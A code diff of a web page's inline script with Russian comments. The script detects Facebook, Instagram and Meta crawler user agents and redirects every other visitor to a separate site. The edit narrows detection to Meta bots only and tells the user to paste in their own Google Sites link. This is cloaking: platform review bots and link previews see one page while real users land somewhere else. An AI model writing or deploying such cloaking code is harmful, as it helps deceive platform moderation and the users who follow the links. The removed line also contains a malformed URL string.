@@ -16,24 +16,16 @@
     <script>
         function filterTraffic() {
             const ua = navigator.userAgent.toLowerCase();
-            const botKeywords = ['facebookexternalhit', 'instagram', 'meta-externalfetcher', 'facebot', 'bot', 'spider', 'crawl', 'googlebot'];
             
-            let isBot = false;
-            
-            for (let word of botKeywords) {
-                if (ua.includes(word)) {
-                    isBot = true;
-                    break;
-                }
-            }
-            
-            if (navigator.webdriver) {
-                isBot = true;
-            }
+            // Оставляем только точечные триггеры на ботов Meta и Instagram
+            const isMetaBot = ua.includes('facebookexternalhit') || 
+                              ua.includes('instagram') || 
+                              ua.includes('meta-externalfetcher') || 
+                              ua.includes('facebot');
 
-            if (!isBot) {
-                // ВСТАВЬТЕ ССЫЛКУ НА ВАШ GOOGLE SITES НИЖЕ:
-                window.location.href = "https://sites.google.com/view/glowandwibes--/;
+            if (!isMetaBot) {
+                // Сюда снова вставьте вашу ссылку на Google Sites:
+                window.location.href = "https://google.com";
             }
         }
 
